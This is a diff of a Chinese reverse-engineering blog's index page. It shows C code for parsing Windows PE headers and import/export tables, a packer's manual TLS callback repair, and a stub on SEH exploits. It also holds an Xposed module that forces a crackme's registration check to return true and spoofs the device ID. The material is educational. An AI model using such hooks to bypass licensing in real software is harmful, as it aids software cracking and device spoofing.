-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL IsPeFile(char *pFileBuf) &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFileBuf;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFileBuf);</span><br><span class="line">	if (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE || pNt-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">		printf(&quot;file is not pe\n&quot;);</span><br><span class="line">		return FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>RVA to FOA</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DWORD RVAtoFOA(DWORD dwRVA, char* pBase) &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pBase);</span><br><span class="line">	//获取区段个数</span><br><span class="line">	DWORD dwSectionCount = pNt-&gt;FileHeader.NumberOfSections;</span><br><span class="line">	//获取第一个区段表的地址</span><br><span class="line">	PIMAGE_SECTION_HEADER pSec1= IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">	//循环比对地址落在哪个区段内</span><br><span class="line">	for (DWORD i = 0; i &lt; dwSectionCount; i++) &#123;</span><br><span class="line">		if (dwRVA &gt;= pSec1-&gt;VirtualAddress &amp;&amp; dwRVA &lt;= (pSec1-&gt;VirtualAddress +</span><br><span class="line">			pSec1-&gt;SizeOfRawData)) &#123;</span><br><span class="line">			return dwRVA - </span><br><span class="line">				pSec1-&gt;VirtualAddress + </span><br><span class="line">				pSec1-&gt;PointerToRawData;</span><br><span class="line">		&#125;</span><br><span class="line">		//下一个区段地址</span><br><span class="line">		pSec1++;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>显示PE文件中的一些重要字段</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void ShowImportantData(char *pFile) &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFile;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFile);</span><br><span class="line">	//加载基址</span><br><span class="line">	printf(&quot;加载基址:0x%X\n&quot;, pNt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">	//OEP 入口点</span><br><span class="line">	printf(&quot;OEP 入口点:0x%X\n&quot;, pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">	//文件属性</span><br><span class="line">	printf(&quot;文件属性:0x%X\n&quot;, pNt-&gt;FileHeader.Characteristics);</span><br><span class="line">	//32bit或者是64bit</span><br><span class="line">	printf(&quot;文件特性:%s\n&quot;, pNt-&gt;OptionalHeader.Magic==0x10B?&quot;32位&quot;:&quot;64位&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>导出表</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">//遍历导出表</span><br><span class="line">void TraExportTable(char* pFileBase)</span><br><span class="line">&#123;</span><br><span class="line">	//找到导出表</span><br><span class="line">	PIMAGE_DOS_HEADER pDos =</span><br><span class="line">		(PIMAGE_DOS_HEADER)pFileBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt =</span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFileBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pExportDir = </span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)&amp;pNt-&gt;OptionalHeader.DataDirectory[0];</span><br><span class="line">	//判断是否有导出表</span><br><span class="line">	if (!pExportDir-&gt;Size)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;没有导出表\n&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	//获取导出表的FOA</span><br><span class="line">	DWORD dwExportFOA = RVAtoFOA(pExportDir-&gt;VirtualAddress,</span><br><span class="line">		                 pFileBase);</span><br><span class="line">	//导出表再文件中的位置</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportTable = </span><br><span class="line">		        (PIMAGE_EXPORT_DIRECTORY)(dwExportFOA + pFileBase);</span><br><span class="line"></span><br><span class="line">	//打印名字</span><br><span class="line">	char* pFileName = </span><br><span class="line">		RVAtoFOA(pExportTable-&gt;Name, pFileBase) + pFileBase;</span><br><span class="line">	printf(&quot;模块名：%s\n&quot;, pFileName);</span><br><span class="line"></span><br><span class="line">	//获取函数地址表中元素个数</span><br><span class="line">	DWORD dwFunCount = pExportTable-&gt;NumberOfFunctions;</span><br><span class="line">	//获取函数名称表中元素个数</span><br><span class="line">	DWORD dwFunNameCount = pExportTable-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">	//地址表地址</span><br><span class="line">	PDWORD pAddress = </span><br><span class="line">		(PDWORD)(RVAtoFOA(pExportTable-&gt;AddressOfFunctions,pFileBase) + pFileBase);</span><br><span class="line">	//名称表地址</span><br><span class="line">	PDWORD pName =</span><br><span class="line">		(PDWORD)(RVAtoFOA(pExportTable-&gt;AddressOfNames, pFileBase) + pFileBase);</span><br><span class="line">	//序号表地址</span><br><span class="line">	PWORD pOrdinal =</span><br><span class="line">		(PWORD)(RVAtoFOA(pExportTable-&gt;AddressOfNameOrdinals, pFileBase) + pFileBase);</span><br><span class="line"></span><br><span class="line">	for (DWORD i = 0; i &lt; dwFunCount;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (pAddress[i] == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			continue;</span><br><span class="line">		&#125;</span><br><span class="line">		//判断是否是名称导出</span><br><span class="line">		BOOL bFlag = FALSE;</span><br><span class="line">		for (DWORD n = 0; n &lt; dwFunNameCount;n++)</span><br><span class="line">		&#123;</span><br><span class="line">			if (i == pOrdinal[n])</span><br><span class="line">			&#123;</span><br><span class="line">				bFlag = TRUE;</span><br><span class="line">				//有名字就到名称表中找到名称的地址</span><br><span class="line">				char* pFunName = RVAtoFOA(pName[n], pFileBase) + pFileBase;</span><br><span class="line">				printf(&quot;函数名： %s函数序号：%d\n&quot;, pFunName, i + pExportTable-&gt;Base);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		//序号导出</span><br><span class="line">		if (!bFlag)</span><br><span class="line">		   printf(&quot;函数名：【NULL】函数序号：%d\n&quot;,  i + pExportTable-&gt;Base);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>导入表</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">//遍历导入表</span><br><span class="line">void TraImportTable(char* pFileBase)</span><br><span class="line">&#123;</span><br><span class="line">	//找到导出表</span><br><span class="line">	PIMAGE_DOS_HEADER pDos =</span><br><span class="line">		(PIMAGE_DOS_HEADER)pFileBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt =</span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + pFileBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pImportDir =</span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)&amp;pNt-&gt;OptionalHeader.DataDirectory[1];</span><br><span class="line">	//是否有导入表</span><br><span class="line">	if (pImportDir-&gt;Size == 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;没有导入表\n&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	//获取导入表再文件中的地址</span><br><span class="line">	DWORD dwFOA = RVAtoFOA(pImportDir-&gt;VirtualAddress, pFileBase);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImportTable = </span><br><span class="line">		         (PIMAGE_IMPORT_DESCRIPTOR)(dwFOA + pFileBase);</span><br><span class="line">	//以一个全0结构结尾</span><br><span class="line">	while (pImportTable-&gt;Name)</span><br><span class="line">	&#123;</span><br><span class="line">		//显示模块名</span><br><span class="line">		printf(&quot;模块名：%s\n&quot;,RVAtoFOA(pImportTable-&gt;Name, pFileBase) + pFileBase);</span><br><span class="line">		//通过OriginalFirstThunk（INT）或者FirstThunk（IAT）都可以便利到函数名</span><br><span class="line">		PIMAGE_THUNK_DATA pThunk = </span><br><span class="line">			(PIMAGE_THUNK_DATA)</span><br><span class="line">			(RVAtoFOA(pImportTable-&gt;FirstThunk, pFileBase) + pFileBase);</span><br><span class="line">		while (pThunk-&gt;u1.AddressOfData)</span><br><span class="line">		&#123;</span><br><span class="line">			//判断导入方式如果IMAGE_THUNK_DATA的最高位位0,说明是名称导入，否则就是序号导入</span><br><span class="line">			if (IMAGE_SNAP_BY_ORDINAL32(pThunk-&gt;u1.Ordinal))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;\t函数名：【NULL】 函数序号：%04X\n&quot;,</span><br><span class="line">					pThunk-&gt;u1.Ordinal &amp;&amp; 0xFFFF);</span><br><span class="line">			&#125;</span><br><span class="line">			else //名称导入</span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME pName =</span><br><span class="line">					(PIMAGE_IMPORT_BY_NAME)</span><br><span class="line">					(RVAtoFOA(pThunk-&gt;u1.AddressOfData, pFileBase) + pFileBase);</span><br><span class="line">				printf(&quot;\t函数名：%s 函数序号：%04X\n&quot;, pName-&gt;Name,</span><br><span class="line">					pName-&gt;Hint);</span><br><span class="line">			&#125;</span><br><span class="line">			//下一个函数</span><br><span class="line">			pThunk++;</span><br><span class="line">		&#125;</span><br><span class="line">		//下一个模块的导入信息</span><br><span class="line">		pImportTable++; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>手工调用TLS</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void RepairTLS(char *BaseAddr) &#123;</span><br><span class="line">	IMAGE_DATA_DIRECTORY * pDDir = GetOptionHeader(BaseAddr)-&gt;DataDirectory;</span><br><span class="line">	//压缩后将数据目录表的TLS修复</span><br><span class="line">	if (g_Sc.TlsDataDir.VirtualAddress!=0x0) &#123;</span><br><span class="line"></span><br><span class="line">		DWORD oldProtect;</span><br><span class="line">		VirtualProtect(pDDir + 9, 8,PAGE_READWRITE,&amp;oldProtect);</span><br><span class="line">		memcpy(pDDir + 9, (void *)&amp;g_Sc.TlsDataDir, sizeof(IMAGE_DATA_DIRECTORY));</span><br><span class="line">		VirtualProtect(pDDir + 9, 8, oldProtect, &amp;oldProtect);</span><br><span class="line">		//手工调用原TLS函数</span><br><span class="line">		PIMAGE_TLS_DIRECTORY pTlsDir = (PIMAGE_TLS_DIRECTORY)((pDDir + 9)-&gt;VirtualAddress + BaseAddr);</span><br><span class="line">		PIMAGE_TLS_CALLBACK* lpTlsFun = (PIMAGE_TLS_CALLBACK*)(pTlsDir-&gt;AddressOfCallBacks);</span><br><span class="line">		while ((*lpTlsFun) != NULL) &#123; //判断是否有TLS回调函数</span><br><span class="line">			(*lpTlsFun)(BaseAddr, DLL_PROCESS_ATTACH, NULL);</span><br><span class="line">			lpTlsFun++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/PE文件编程/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-exploit_3_基于SEH的exploit_1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/exploit_3_基于SEH的exploit_1/">exploit_3_基于SEH的exploit_1</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/exploit_3_基于SEH的exploit_1/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>实验版本:<br>windows sp2<br>soritong mp3 player 1.0<br>ollydbg</p>
-<blockquote>
-<p>基础知识</p>
-</blockquote>
-<p>在xp sp1后S添加了GS/DEP/SafeSEH以及其他保护机制</p>
-<ul>
-<li>Xor<br>在调用异常处理例程之前,所有的寄存器都会先被清空</li>
-<li><p>Dep&amp;Stack Cookies</p>
-</li>
-<li><p>SafeSEH<br>新增一些额外保护,禁止非法的SEH覆盖</p>
-</li>
-<li><p>Windows 2003</p>
-</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">shellcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/exploit_3_基于SEH的exploit_1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
     <article id="post-ollydbg软件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1046,6 +721,301 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/20/ollydbg软件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-android_hook" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/android_hook/">android_hook</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/android_hook/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li><p>Cydia Substrate</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>xposed</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.新建一个无Activity工程</span><br><span class="line"></span><br><span class="line">2.设置清单文件</span><br><span class="line">添加如下:</span><br><span class="line">	&lt;!--使xposed模块有效--&gt;</span><br><span class="line">    &lt;meta-data android:name=&quot;xposedmodule&quot; android:value=&quot;true&quot;&gt;&lt;/meta-data&gt;</span><br><span class="line">    &lt;!--xposed模块名称--&gt;</span><br><span class="line">    &lt;meta-data android:name=&quot;xposeddescription&quot; android:value=&quot;xy神器插件&quot;&gt;&lt;/meta-data&gt;</span><br><span class="line">    &lt;!--xposed模块最低版本--&gt;</span><br><span class="line">    &lt;meta-data android:name=&quot;xposedminversion&quot; android:value=&quot;54&quot;&gt;&lt;/meta-data&gt;</span><br><span class="line"></span><br><span class="line">3.导入Xposed jar包,并设置为privoder</span><br><span class="line">project-&gt;app目录下新建一个目录,例如起名为lib</span><br><span class="line">Xposed jar包复制到lib目录下</span><br><span class="line">工程文件夹右键找到open module settings-&gt;apps-&gt;Dependencies</span><br><span class="line">添加lib目录下的Xposed jar包,scope选择runtime only/provided</span><br><span class="line"></span><br><span class="line">4.创建main类,实现xposed中的接口</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>xposed接口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">package com.kebao.xposehook;</span><br><span class="line"></span><br><span class="line">import android.util.Log;</span><br><span class="line">import android.telephony.TelephonyManager;</span><br><span class="line"></span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line">public class Main implements IXposedHookLoadPackage &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hook1(loadPackageParam);</span><br><span class="line">        hook2(loadPackageParam);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void hook2(XC_LoadPackage.LoadPackageParam loadPackageParam) &#123;</span><br><span class="line"></span><br><span class="line">        // 分析信息</span><br><span class="line">        // hook的包名：com.bluelesson.crackme002</span><br><span class="line">        // hook的类名：com.bluelesson.crackme002.MainActivity</span><br><span class="line">        // hook的方法原型：boolean CheckRegister(String src, String dest)</span><br><span class="line">        String packageName = &quot;com.bluelesson.crackme002&quot;;</span><br><span class="line">        // 判断是不是对应的包，不是直接返回</span><br><span class="line">        if(!loadPackageParam.packageName.equals(packageName))&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(&quot;info findAndHookMethod CheckRegister&quot;);// 显示在Hook框架日志窗口中</span><br><span class="line">        // hook指定的类方法</span><br><span class="line">        XposedHelpers.findAndHookMethod(&quot;com.bluelesson.crackme002.MainActivity&quot;,</span><br><span class="line">                loadPackageParam.classLoader,</span><br><span class="line">                &quot;CheckRegister&quot;, String.class, String.class,</span><br><span class="line">                new XC_MethodHook() &#123;</span><br><span class="line">                    @Override</span><br><span class="line">                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                        super.beforeHookedMethod(param);</span><br><span class="line"></span><br><span class="line">                        XposedBridge.log(&quot;参数1：&quot; + param.args[0]);</span><br><span class="line">                        XposedBridge.log(&quot;参数2：&quot; + param.args[1]);</span><br><span class="line"></span><br><span class="line">                        param.args[0] = &quot;Hello&quot;;</span><br><span class="line">                        param.args[1] = &quot;15PB&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    @Override</span><br><span class="line">                    protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                        super.afterHookedMethod(param);</span><br><span class="line"></span><br><span class="line">                        XposedBridge.log(&quot;参数1：&quot; + param.args[0]);</span><br><span class="line">                        XposedBridge.log(&quot;参数2：&quot; + param.args[1]);</span><br><span class="line"></span><br><span class="line">                        param.setResult(true);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void hook1(XC_LoadPackage.LoadPackageParam loadPackageParam)&#123;</span><br><span class="line">        // 分析信息</span><br><span class="line">        // hook的包名：com.bluelesson.testphoneinfo</span><br><span class="line">        // hook的类名：android.telephony.TelephonyManager</span><br><span class="line">        // hook的方法原型：public String getDeviceId()</span><br><span class="line"></span><br><span class="line">        String packageName = &quot;com.bluelesson.testphoneinfo&quot;;</span><br><span class="line">        // 判断是不是对应的包，不是直接返回</span><br><span class="line">        if(!loadPackageParam.packageName.equals(packageName))&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(&quot;info findAndHookMethod getDeviceId&quot;);// 显示在Hook框架日志窗口中</span><br><span class="line">        // hook指定的类方法</span><br><span class="line">        XposedHelpers.findAndHookMethod(TelephonyManager.class, &quot;getDeviceId&quot;, new XC_MethodReplacement() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable &#123;</span><br><span class="line">                XposedBridge.log(&quot;info replaceHookedMethod&quot;);</span><br><span class="line">                return &quot;我就是序列号&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/android_hook/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
